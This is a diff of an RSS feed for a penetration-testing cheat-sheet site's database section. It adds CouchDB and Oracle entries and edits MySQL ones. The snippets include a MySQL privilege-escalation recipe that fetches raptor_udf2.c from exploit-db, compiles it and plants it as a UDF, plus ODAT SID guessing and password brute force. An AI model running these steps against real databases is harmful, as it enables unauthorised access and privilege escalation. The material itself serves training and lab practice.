@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@database/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>CouchDB</title>
+      <link>https://tldrbins.github.io/couchdb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/couchdb/</guid>
+      <description> Basic # Show all databases curl http://localhost:5984/_all_dbs # Show all databases (With Creds) curl http://user:password@localhost:5984/_all_dbs # Show all docs from database curl http://localhost:5984/DB_name/_all_docs # Show Entry curl http://localhost:5984/DB_name/ID_hash </description>
+    </item>
+    <item>
       <title>MongoDB General</title>
       <link>https://tldrbins.github.io/mongodb_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -40,7 +47,7 @@
       <link>https://tldrbins.github.io/mysql_interactoin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mysql_interactoin/</guid>
-      <description> General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.com&amp;#39;; </description>
+      <description>General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p # Execute query inline mysql -u user -D db_name -h 10.10.11.10 -pPassword -e &amp;#39;show tables;&amp;#39; Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.</description>
     </item>
     <item>
       <title>Mysql Privilege Escalation</title>
@@ -48,6 +55,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mysql_privilege_escalation/</guid>
       <description>Privilege Escalation User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -pPassword mysql # UDF create table foo(line blob); insert into foo values(load_file(&amp;#39;/dev/shm/raptor_udf2.so&amp;#39;)); # Get plug-in directory show variables like &amp;#39;%plugin%&amp;#39;; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile &amp;#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.</description>
+    </item>
+    <item>
+      <title>Oracle Database</title>
+      <link>https://tldrbins.github.io/oracle/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/oracle/</guid>
+      <description>Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT&#xA;# Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d SID --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.</description>
     </item>
   </channel>
 </rss>
